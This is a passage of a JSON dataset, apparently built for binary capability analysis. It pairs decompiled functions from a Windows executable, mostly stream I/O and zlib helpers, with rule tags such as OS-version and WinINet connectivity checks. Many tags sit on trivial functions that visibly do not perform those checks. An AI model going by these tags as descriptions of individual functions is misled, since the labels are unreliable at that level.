&fcn.00417d80::var_138ch;\n        puStackY40 = 0x417df2;\n        (**0x463038)();\n        puStackY40 = arg_8h;\n        puStackY44 = &fcn.00417d80::var_138ch;\n        puStackY48 = 0x417e00;\n        (**0x463038)();\n        puStackY48 = &fcn.00417d80::var_138ch;\n        uStackY52 = 0x447794;\n        puStackY56 = 0x417e12;\n        (**0x462ec4)();\n        puStackY56 = 0x1388;\n        puStackY64 = &fcn.00417d80::var_138ch;\n        uStackY60 = 0;\n        uStackY68 = 0x417e25;\n        fcn.0042a6e0();\n        puStackY56 = *0x452250;\n        uStackY60 = 0x417e34;\n        *0x45258c = (**0x46302c)();\n        if (*0x45258c != NULL) {\n            uStackY12 = *0x451dd4;\n            uStackY20 = 0x417e4f;\n            puStackY16 = *0x45258c;\n            *0x452580 = (**0x462f8c)();\n            uStackY20 = *0x4521b4;\n            puStackY24 = *0x45258c;\n            puStackY28 = 0x417e67;\n            *0x4525a0 = (**0x462f8c)();\n            puStackY28 = *0x451cd0;\n            puStackY32 = *0x45258c;\n            puStackY36 = 0x417e80;\n            *0x452548 = (**0x462f8c)();\n            puStackY36 = *0x451c04;\n            puStackY40 = *0x45258c;\n            puStackY44 = 0x417e98;\n            *0x452570 = (**0x462f8c)();\n            puStackY44 = *0x452368;\n            puStackY48 = *0x45258c;\n            uStackY52 = 0x417eb0;\n            *0x452590 = (**0x462f8c)();\n            uStackY52 = *0x451e7c;\n            puStackY56 = *0x45258c;\n            uStackY60 = 0x417ec9;\n            *0x452568 = (**0x462f8c)();\n        }\n        if ((((*0x452580 != 0) && (*0x4525a0 != 0)) && (*0x452548 != 0)) &&\n           (((*0x452590 != 0 && (*0x452568 != 0)) && (*0x452570 != 0)))) {\n            var_4h = 0x417f14;\n            fcn.0042a75a(unaff_EBP);\n            return;\n        }\n    }\n    var_4h = 0x417f25;\n    fcn.0042a75a(unaff_EBP);\n    return;\n}\n",
        "token_count": 1109
    },
    "00418230": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00418230(int32_t param_1)\n\n{\n    if (**(param_1 + 0x20) != 0) {\n        return;\n    }\n    return;\n}\n",
        "token_count": 45
    },
    "00418440": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00418440(uint32_t arg_8h, uint arg_ch)\n\n{\n    uint uVar1;\n    int32_t in_ECX;\n    uint32_t uVar2;\n    uint32_t extraout_ECX;\n    uint32_t extraout_ECX_00;\n    uint var_14h;\n    uint var_8h;\n    uint var_4h;\n    \n    *(in_ECX + 0xc) = arg_8h & 0x17;\n    uVar2 = *(in_ECX + 0x10) & arg_8h & 0x17;\n    if (uVar2 != 0) {\n        if (arg_ch != '\\0') {\n            fcn.0042b331(0, 0);\n            uVar2 = extraout_ECX;\n        }\n        if ((uVar2 & 4) != 0) {\n            var_4h = fcn.0042a223();\n            arg_ch = 0x44783c;\n            fcn.0042ac29(&arg_ch);\n            var_8h = 1;\n            var_14h = 0x447804;\n            fcn.0042b331(&var_14h, 0x44d2e4);\n            uVar2 = extraout_ECX_00;\n        }\n        if ((uVar2 & 2) != 0) {\n            uVar1 = fcn.0042a223();\n            arg_ch = 0x447824;\n            fcn.0042ac29(&arg_ch);\n            var_8h = 1;\n            var_14h = 0x447804;\n            var_4h = uVar1;\n            fcn.0042b331(&var_14h, 0x44d2e4);\n        }\n        uVar1 = fcn.0042a223();\n        arg_ch = 0x44780c;\n        fcn.0042ac29(&arg_ch);\n        var_8h = 1;\n        var_14h = 0x447804;\n        var_4h = uVar1;\n        fcn.0042b331(&var_14h, 0x44d2e4);\n    }\n    return;\n}\n",
        "token_count": 493
    },
    "00418750": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00418750(int32_t param_1)\n\n{\n    if (**(param_1 + 0x24) != 0) {\n        return;\n    }\n    return;\n}\n",
        "token_count": 45
    },
    "004187a0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x004187d8)\n// WARNING: Removing unreachable block (ram,0x004187e5)\n\nint64_t __cdecl fcn.004187a0(uchar *arg_8h, uint32_t arg_ch, int32_t arg_10h)\n\n{\n    int64_t iVar1;\n    int32_t iVar2;\n    int32_t *in_ECX;\n    uint32_t arg_10h_00;\n    bool bVar3;\n    int64_t iVar4;\n    uint var_8h;\n    uint var_4h;\n    \n    if ((-1 < arg_10h) && ((iVar1 = 0,  0 < arg_10h || (iVar1 = 0,  arg_ch != 0)))) {\n        while( true ) {\n            do {\n                iVar4 = fcn.00418230();\n                if (iVar4 < 1) {\n                    iVar2 = (**(*in_ECX + 0x1c))();\n                    if (iVar2 == -1) {\n                        return iVar1;\n                    }\n                    *arg_8h = iVar2;\n                    iVar1 = iVar1 + 1;\n                    bVar3 = arg_ch != 0;\n                    arg_ch = arg_ch - 1;\n                    arg_10h = arg_10h + -1 + bVar3;\n                    arg_8h = arg_8h + 1;\n                }\n                else {\n                    if (CONCAT44(arg_10h, arg_ch) < iVar4) {\n                        iVar4 = CONCAT44(arg_10h, arg_ch);\n                    }\n                    arg_10h_00 = iVar4;\n                    fcn.0042a840(arg_8h, *in_ECX[8], arg_10h_00);\n                    iVar1 = iVar4 + iVar1;\n                    bVar3 = arg_ch < arg_10h_00;\n                    arg_ch = arg_ch - arg_10h_00;\n                    arg_10h = (arg_10h - (iVar4 >> 0x20)) - bVar3;\n                    *in_ECX[0xc] = *in_ECX[0xc] - arg_10h_00;\n                    *in_ECX[8] = *in_ECX[8] + arg_10h_00;\n                    arg_8h = arg_8h + arg_10h_00;\n                }\n            } while (0 < arg_10h);\n            if (arg_10h < 0) break;\n            if (arg_ch == 0) {\n                return iVar1;\n            }\n        }\n        return iVar1;\n    }\n    return 0;\n}\n",
        "token_count": 579
    },
    "00418870": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x004188a8)\n// WARNING: Removing unreachable block (ram,0x004188b5)\n\nint64_t __cdecl fcn.00418870(uchar *arg_8h, uint32_t arg_ch, int32_t arg_10h)\n\n{\n    int64_t iVar1;\n    int32_t iVar2;\n    int32_t *in_ECX;\n    uint32_t arg_10h_00;\n    bool bVar3;\n    int64_t iVar4;\n    uint var_8h;\n    uint var_4h;\n    \n    if ((-1 < arg_10h) && ((iVar1 = 0,  0 < arg_10h || (iVar1 = 0,  arg_ch != 0)))) {\n        while( true ) {\n            do {\n                iVar4 = fcn.00418750();\n                if (iVar4 < 1) {\n                    iVar2 = (**(*in_ECX + 0xc))(*arg_8h);\n                    if (iVar2 == -1) {\n                        return iVar1;\n                    }\n                    arg_8h = arg_8h + 1;\n                    iVar1 = iVar1 + 1;\n                    bVar3 = arg_ch != 0;\n                    arg_ch = arg_ch - 1;\n                    arg_10h = arg_10h + -1 + bVar3;\n                }\n                else {\n                    if (CONCAT44(arg_10h, arg_ch) < iVar4) {\n                        iVar4 = CONCAT44(arg_10h, arg_ch);\n                    }\n                    arg_10h_00 = iVar4;\n                    fcn.0042a840(*in_ECX[9], arg_8h, arg_10h_00);\n                    arg_8h = arg_8h + arg_10h_00;\n                    iVar1 = iVar4 + iVar1;\n                    bVar3 = arg_ch < arg_10h_00;\n                    arg_ch = arg_ch - arg_10h_00;\n                    arg_10h = (arg_10h - (iVar4 >> 0x20)) - bVar3;\n                    *in_ECX[0xd] = *in_ECX[0xd] - arg_10h_00;\n                    *in_ECX[9] = *in_ECX[9] + arg_10h_00;\n                }\n            } while (0 < arg_10h);\n            if (arg_10h < 0) break;\n            if (arg_ch == 0) {\n                return iVar1;\n            }\n        }\n        return iVar1;\n    }\n    return 0;\n}\n",
        "token_count": 571
    },
    "00418da0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.00418da0(int32_t *param_1)\n\n{\n    int32_t *piVar1;\n    uint8_t *puVar2;\n    uint32_t uVar3;\n    \n    if (*param_1[8] != 0) {\n        if (1 < *param_1[0xc]) {\n            *param_1[0xc] = *param_1[0xc] + -1;\n            puVar2 = *param_1[8] + 1;\n            *param_1[8] = puVar2;\n            return *puVar2;\n        }\n        if ((*param_1[8] != 0) && (piVar1 = param_1[0xc],  0 < *piVar1)) {\n            *piVar1 = *piVar1 + -1;\n            puVar2 = *param_1[8];\n            *param_1[8] = puVar2 + 1;\n            uVar3 = *puVar2;\n            goto code_r0x00418df0;\n        }\n    }\n    uVar3 = (**(*param_1 + 0x1c))();\ncode_r0x00418df0:\n    if (uVar3 == 0xffffffff) {\n        return 0xffffffff;\n    }\n    if ((*param_1[8] != NULL) && (0 < *param_1[0xc])) {\n        return **param_1[8];\n    }\n    // WARNING: Could not recover jumptable at 0x00418e18. Too many branches\n    // WARNING: Treating indirect jump as call\n    uVar3 = (**(*param_1 + 0x18))();\n    return uVar3;\n}\n",
        "token_count": 381
    },
    "00418e20": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00418e20(int32_t arg_8h, int32_t arg_ch)\n\n{\n    int32_t in_ECX;\n    \n    *(in_ECX + 0x10) = in_ECX + 8;\n    *(in_ECX + 0x20) = in_ECX + 0x18;\n    *(in_ECX + 0x24) = in_ECX + 0x1c;\n    *(in_ECX + 0x50) = arg_ch == 1;\n    *(in_ECX + 0x30) = in_ECX + 0x28;\n    *(in_ECX + 0x49) = 0;\n    *(in_ECX + 0x14) = in_ECX + 0xc;\n    *(in_ECX + 0x34) = in_ECX + 0x2c;\n    *(in_ECX + 0xc) = 0;\n    **(in_ECX + 0x24) = 0;\n    **(in_ECX + 0x34) = 0;\n    **(in_ECX + 0x10) = 0;\n    **(in_ECX + 0x20) = 0;\n    **(in_ECX + 0x30) = 0;\n    if (arg_8h != 0) {\n        *(in_ECX + 0x10) = arg_8h + 8;\n        *(in_ECX + 0x14) = arg_8h + 8;\n        *(in_ECX + 0x20) = arg_8h;\n        *(in_ECX + 0x24) = arg_8h;\n        *(in_ECX + 0x30) = arg_8h + 4;\n        *(in_ECX + 0x34) = arg_8h + 4;\n    }\n    *(in_ECX + 0x54) = arg_8h;\n    *(in_ECX + 0x4c) = *0x4625e0;\n    *(in_ECX + 0x44) = 0;\n    return;\n}\n",
        "token_count": 472
    },
    "00418fb0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00418fb0(int32_t *arg_8h)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t arg_8h_00;\n    int32_t *in_FS_OFFSET;\n    uint uVar4;\n    uint uVar5;\n    uint var_24h;\n    uint var_18h;\n    uint var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x43e508;\n    var_ch = *in_FS_OFFSET;\n    uVar1 = *0x4506f0 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    uVar5 = 0;\n    fcn.00429e0b(0);\n    iVar3 = *0x4625e4;\n    var_4h = 0;\n    var_10h = *0x4625e4;\n    if (*0x4631e4 == 0) {\n        uVar4 = 0;\n        fcn.00429e0b(0);\n        if (*0x4631e4 == 0) {\n            *0x4631e0 = *0x4631e0 + 1;\n            *0x4631e4 = *0x4631e0;\n        }\n        fcn.00429e33(uVar4, uVar5, uVar1);\n    }\n    uVar1 = *0x4631e4;\n    iVar2 = *arg_8h;\n    if (*0x4631e4 < *(iVar2 + 0xc)) {\n        arg_8h_00 = *(*(iVar2 + 8) + *0x4631e4 * 4);\n        if (arg_8h_00 == 0) goto code_r0x00419040;\ncode_r0x0041905e:\n        if (arg_8h_00 != 0) goto code_r0x004190c7;\n    }\n    else {\n        arg_8h_00 = 0;\ncode_r0x00419040:\n        if (*(iVar2 + 0x14) == '\\0') goto code_r0x0041905e;\n        iVar2 = fcn.00429ed6();\n        if (uVar1 < *(iVar2 + 0xc)) {\n            arg_8h_00 = *(*(iVar2 + 8) + uVar1 * 4);\n            goto code_r0x0041905e;\n        }\n    }\n    arg_8h_00 = iVar3;\n    if (iVar3 == 0) {\n        iVar3 = fcn.00418cc0(&var_10h, arg_8h);\n        if (iVar3 == -1) {\n            fcn.0042ac85(\" inflate 1.1.3 Copyright 1995-1998 Mark Adler \");\n            fcn.0042b331(&var_24h, 0x44d468);\n        }\n        arg_8h_00 = var_10h;\n        *0x4625e4 = var_10h;\n        fcn.00429e0b(0);\n        if (*(arg_8h_00 + 4) != -1) {\n            *(arg_8h_00 + 4) = *(arg_8h_00 + 4) + 1;\n        }\n        fcn.00429e33();\n        fcn.00429e5f(arg_8h_00);\n    }\ncode_r0x004190c7:\n    var_4h = 0xffffffff;\n    fcn.00429e33();\n    *in_FS_OFFSET = var_ch;\n    return arg_8h_00;\n}\n",
        "token_count": 855
    },
    "004191a0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nint32_t * __fastcall fcn.004191a0(int32_t *param_1)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    \n    uVar2 = 0;\n    if ((*(*(*param_1 + 4) + 0xc + param_1) & 6) == 0) {\n        iVar1 = (**(**(*(*param_1 + 4) + 0x38 + param_1) + 0x34))();\n        if (iVar1 == -1) {\n            uVar2 = 4;\n        }\n    }\n    if (uVar2 != 0) {\n        uVar2 = *(param_1 + *(*param_1 + 4) + 0xc) | uVar2;\n        if (*(param_1 + *(*param_1 + 4) + 0x38) == 0) {\n            uVar2 = uVar2 | 4;\n        }\n        fcn.00418440(uVar2, 0);\n    }\n    return param_1;\n}\n",
        "token_count": 233
    },
    "null": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "",
        "token_count": 0
    },
    "00419490": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00419490(uint32_t arg_8h)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    int32_t in_ECX;\n    \n    uVar1 = **(in_ECX + 0x20);\n    if (((uVar1 != 0) && (**(in_ECX + 0x10) < uVar1)) && ((arg_8h == 0xffffffff || (*(uVar1 - 1) == arg_8h)))) {\n        **(in_ECX + 0x30) = **(in_ECX + 0x30) + 1;\n        **(in_ECX + 0x20) = **(in_ECX + 0x20) + -1;\n        return -(arg_8h != 0xffffffff) & arg_8h;\n    }\n    if ((*(in_ECX + 0x54) != 0) && (arg_8h != 0xffffffff)) {\n        if ((*(in_ECX + 0x44) == 0) && (iVar2 = fcn.0042d901(arg_8h & 0xff, *(in_ECX + 0x54)),  iVar2 != -1)) {\n            return arg_8h;\n        }\n        if (**(in_ECX + 0x20) != in_ECX + 0x48) {\n            *(in_ECX + 0x48) = arg_8h;\n            fcn.00419450();\n            return arg_8h;\n        }\n    }\n    return 0xffffffff;\n}\n",
        "token_count": 351
    },
    "00419630": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00419630(int32_t *arg_8h)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t arg_8h_00;\n    int32_t *in_FS_OFFSET;\n    uint uVar4;\n    uint uVar5;\n    uint var_24h;\n    uint var_18h;\n    uint var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x43e508;\n    var_ch = *in_FS_OFFSET;\n    uVar1 = *0x4506f0 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    uVar5 = 0;\n    fcn.00429e0b(0);\n    iVar3 = *0x4625e8;\n    var_4h = 0;\n    var_10h = *0x4625e8;\n    if (*0x4625ec == 0) {\n        uVar4 = 0;\n        fcn.00429e0b(0);\n        if (*0x4625ec == 0) {\n            *0x4625ec = *0x4631e0 + 1;\n            *0x4631e0 = *0x4625ec;\n        }\n        fcn.00429e33(uVar4, uVar5, uVar1);\n    }\n    uVar1 = *0x4625ec;\n    iVar2 = *arg_8h;\n    if (*0x4625ec < *(iVar2 + 0xc)) {\n        arg_8h_00 = *(*(iVar2 + 8) + *0x4625ec * 4);\n        if (arg_8h_00 == 0) goto code_r0x004196c0;\ncode_r0x004196de:\n        if (arg_8h_00 != 0) goto code_r0x00419747;\n    }\n    else {\n        arg_8h_00 = 0;\ncode_r0x004196c0:\n        if (*(iVar2 + 0x14) == '\\0') goto code_r0x004196de;\n        iVar2 = fcn.00429ed6();\n        if (uVar1 < *(iVar2 + 0xc)) {\n            arg_8h_00 = *(*(iVar2 + 8) + uVar1 * 4);\n            goto code_r0x004196de;\n        }\n    }\n    arg_8h_00 = iVar3;\n    if (iVar3 == 0) {\n        iVar3 = fcn.004190f0(&var_10h, arg_8h);\n        if (iVar3 == -1) {\n            fcn.0042ac85(\" inflate 1.1.3 Copyright 1995-1998 Mark Adler \");\n            fcn.0042b331(&var_24h, 0x44d468);\n        }\n        arg_8h_00 = var_10h;\n        *0x4625e8 = var_10h;\n        fcn.00429e0b(0);\n        if (*(arg_8h_00 + 4) != -1) {\n            *(arg_8h_00 + 4) = *(arg_8h_00 + 4) + 1;\n        }\n        fcn.00429e33();\n        fcn.00429e5f(arg_8h_00);\n    }\ncode_r0x00419747:\n    var_4h = 0xffffffff;\n    fcn.00429e33();\n    *in_FS_OFFSET = var_ch;\n    return arg_8h_00;\n}\n",
        "token_count": 844
    },
    "004197b0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.004197b0(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    char cVar1;\n    int32_t arg_8h_00;\n    uint arg_8h_01;\n    int32_t *piVar2;\n    int32_t in_ECX;\n    int32_t *in_FS_OFFSET;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x43e538;\n    var_ch = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_ch;\n    if (*(in_ECX + 0x54) == 0) {\n        arg_8h_00 = fcn.0042a563(arg_8h, arg_ch, arg_10h);\n        if (arg_8h_00 != 0) {\n            fcn.00418e20(arg_8h_00, 1);\n            arg_8h_01 = fcn.00418250(&arg_10h);\n            var_4h = 0;\n            piVar2 = fcn.00419630(arg_8h_01);\n            cVar1 = (**(*piVar2 + 4))();\n            if (cVar1 != '\\0') {\n                *(in_ECX + 0x44) = 0;\n                fcn.00415140();\n                *in_FS_OFFSET = var_ch;\n                return in_ECX;\n            }\n            *(in_ECX + 0x44) = piVar2;\n            fcn.00418a40();\n            fcn.00415140();\n            *in_FS_OFFSET = var_ch;\n            return in_ECX;\n        }\n    }\n    *in_FS_OFFSET = var_ch;\n    return 0;\n}\n",
        "token_count": 401
    },
    "00419ab0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_30h\n\nvoid __fastcall fcn.00419ab0(int32_t *param_1)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    int32_t iVar3;\n    int32_t *in_FS_OFFSET;\n    int32_t var_30h;\n    uint *var_2ch;\n    int32_t var_1ch;\n    uint32_t var_18h;\n    uint32_t var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x43e598;\n    var_ch = *in_FS_OFFSET;\n    var_10h = *0x4506f0 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    if (((param_1[0x11] != 0) && (*(param_1 + 0x49) != '\\0')) &&\n       (iVar1 = (**(*param_1 + 0xc))(0xffffffff, var_10h),  iVar1 != -1)) {\n        var_18h = 0xf;\n        var_1ch = 0;\n        var_2ch = var_2ch & 0xffffff00;\n        fcn.0042a6e0(&var_2ch, 0, 8);\n        var_1ch = 8;\n        puVar2 = var_2ch;\n        if (var_18h < 0x10) {\n            puVar2 = &var_2ch;\n        }\n        *(puVar2 + 2) = 0;\n        var_4h = 0;\n        while( true ) {\n            puVar2 = var_2ch;\n            if (var_18h < 0x10) {\n                puVar2 = &var_2ch;\n            }\n            iVar1 = (**(*param_1[0x11] + 0x18))(param_1 + 0x13, puVar2, puVar2 + var_1ch, &var_30h);\n            if (iVar1 != 0) break;\n            *(param_1 + 0x49) = 0;\ncode_r0x00419b77:\n            puVar2 = var_2ch;\n            if (var_18h < 0x10) {\n                puVar2 = &var_2ch;\n            }\n            iVar1 = var_30h - puVar2;\n            if (iVar1 != 0) {\n                puVar2 = var_2ch;\n                if (var_18h < 0x10) {\n                    puVar2 = &var_2ch;\n                }\n                iVar3 = fcn.0042dfc7(puVar2, 1, iVar1, param_1[0x15]);\n                if (iVar1 != iVar3) goto code_r0x00419bcd;\n            }\n            if (*(param_1 + 0x49) == '\\0') goto code_r0x00419bd9;\n            if (iVar1 == 0) {\n                fcn.0040bc50(8, 0);\n            }\n        }\n        if (iVar1 == 1) goto code_r0x00419b77;\n        if (iVar1 != 3) {\ncode_r0x00419bcd:\n            fcn.00405d10();\n            goto code_r0x00419be0;\n        }\ncode_r0x00419bd9:\n        fcn.00405d10();\n    }\ncode_r0x00419be0:\n    *in_FS_OFFSET = var_ch;\n    fcn.0042a75a(var_30h);\n    return;\n}\n",
        "token_count": 822
    },
    "00419c00": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nint32_t * fcn.00419c00(int32_t *param_1, int32_t param_2, uint8_t param_3)\n\n{\n    int32_t *piVar1;\n    int32_t *piVar2;\n    bool bVar3;\n    char cVar4;\n    uint32_t uVar5;\n    int32_t *in_FS_OFFSET;\n    int32_t *var_8h;\n    int32_t var_ch_3;\n    uint var_10h_2;\n    uint var_10h;\n    uint var_ch;\n    uint var_20h;\n    uint var_1ch;\n    uint32_t var_18h;\n    uint var_11h;\n    int32_t var_ch_2;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x43e5d0;\n    var_ch_2 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_ch_2;\n    piVar1 = *(*(*var_8h + 4) + 0x38 + var_8h);\n    var_18h = 0;\n    bVar3 = false;\n    if (piVar1 != NULL) {\n        (**(*piVar1 + 4))();\n    }\n    var_4h = 0;\n    cVar4 = fcn.004191f0(1);\n    uVar5 = 0;\n    if (cVar4 != '\\0') {\n        var_4h = 2;\n        fcn.00405ac0(0, 0xffffffff);\n        piVar1 = *(*(*var_8h + 4) + 0x38 + var_8h);\n        if ((*piVar1[8] == NULL) || (*piVar1[0xc] < 1)) {\n            uVar5 = (**(*piVar1 + 0x18))();\n        }\n        else {\n            uVar5 = **piVar1[8];\n        }\n        while (uVar5 != 0xffffffff) {\n            if (uVar5 == var_10h_2) {\n                piVar1 = *(*(*var_8h + 4) + 0x38 + var_8h);\n                bVar3 = true;\n                if ((*piVar1[8] == 0) || (piVar2 = piVar1[0xc],  *piVar2 < 1)) {\n                    (**(*piVar1 + 0x1c))();\n                }\n                else {\n                    *piVar2 = *piVar2 + -1;\n                    *piVar1[8] = *piVar1[8] + 1;\n                }\n                goto code_r0x00419cf0;\n            }\n            if (0xfffffffd < *(var_ch_3 + 0x10)) {\n                var_18h = 2;\n                goto code_r0x00419cf0;\n            }\n            fcn.0040bc50(1, uVar5);\n            bVar3 = true;\n            uVar5 = fcn.00418da0();\n        }\n        var_18h = 1;\ncode_r0x00419cf0:\n        uVar5 = var_18h;\n        if (bVar3) goto code_r0x00419d03;\n    }\n    var_18h = uVar5 | 2;\ncode_r0x00419d03:\n    var_4h = 1;\n    if (var_18h != 0) {\n        var_18h = *(var_8h + *(*var_8h + 4) + 0xc) | var_18h;\n        if (*(var_8h + *(*var_8h + 4) + 0x38) == 0) {\n            var_18h = var_18h | 4;\n        }\n        fcn.00418440(var_18h, 0);\n    }\n    piVar1 = *(*(*var_8h + 4) + 0x38 + var_8h);\n    var_4h = 0xffffffff;\n    if (piVar1 != NULL) {\n        (**(*piVar1 + 8))();\n    }\n    *in_FS_OFFSET = var_ch_2;\n    return var_8h;\n}\n",
        "token_count": 945
    },
    "0041a140": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041a140(uint *arg_8h, uint32_t arg_ch, uint32_t arg_10h, int32_t arg_14h)\n\n{\n    uint uVar1;\n    char cVar2;\n    int32_t iVar3;\n    int32_t in_ECX;\n    uint32_t arg_ch_00;\n    uint32_t arg_10h_00;\n    \n    arg_ch_00 = arg_ch;\n    arg_10h_00 = arg_10h;\n    if (((**(in_ECX + 0x20) == in_ECX + 0x48) && (arg_14h == 1)) && (*(in_ECX + 0x44) == 0)) {\n        arg_ch_00 = arg_ch - 1;\n        arg_10h_00 = (arg_10h - 1) + (arg_ch != 0);\n    }\n    if ((((*(in_ECX + 0x54) != 0) && (cVar2 = fcn.00419ab0(),  cVar2 != '\\0')) &&\n        ((((arg_ch_00 | arg_10h_00) == 0 && (arg_14h == 1)) ||\n         (iVar3 = fcn.0042e138(*(in_ECX + 0x54), arg_ch_00, arg_10h_00, arg_14h),  iVar3 == 0)))) &&\n       (iVar3 = fcn.0042e041(*(in_ECX + 0x54), &arg_ch),  iVar3 == 0)) {\n        if (**(in_ECX + 0x10) == in_ECX + 0x48) {\n            uVar1 = *(in_ECX + 0x40);\n            **(in_ECX + 0x10) = *(in_ECX + 0x3c);\n            **(in_ECX + 0x20) = uVar1;\n            **(in_ECX + 0x30) = 0;\n        }\n        arg_8h[2] = arg_ch;\n        uVar1 = *(in_ECX + 0x4c);\n        *arg_8h = 0;\n        arg_8h[1] = 0;\n        arg_8h[3] = arg_10h;\n        arg_8h[4] = uVar1;\n        return;\n    }\n    uVar1 = *0x448780;\n    arg_8h[1] = *0x448784;\n    *arg_8h = uVar1;\n    arg_8h[2] = 0;\n    arg_8h[3] = 0;\n    arg_8h[4] = 0;\n    return;\n}\n",
        "token_count": 605
    },
    "0041a570": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
